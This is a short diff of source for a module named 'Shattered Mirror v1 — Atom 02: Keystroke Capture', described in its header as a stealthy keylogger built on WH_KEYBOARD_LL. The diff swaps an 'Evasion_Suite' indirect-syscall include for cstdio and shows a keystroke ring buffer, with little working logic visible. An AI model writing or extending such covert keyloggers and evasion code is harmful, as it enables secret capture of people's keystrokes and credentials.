@@ -1,4 +1,4 @@
-﻿/*=============================================================================
+/*=============================================================================
  * Shattered Mirror v1 — Atom 02: Keystroke Capture
  *
  * Implements a stealthy keylogger using WH_KEYBOARD_LL.
@@ -8,8 +8,7 @@
 
 #include "Atom_02_Key.h"
 #include "../Orchestrator/AtomManager.h"
-#include "../Evasion_Suite/include/indirect_syscall.h"
-#include <cstring>
+#include <cstdio>
 
 /* The ring buffer for keystrokes */
 static char  s_KeyBuffer[KEYLOG_BUFFER_SIZE] = { 0 };
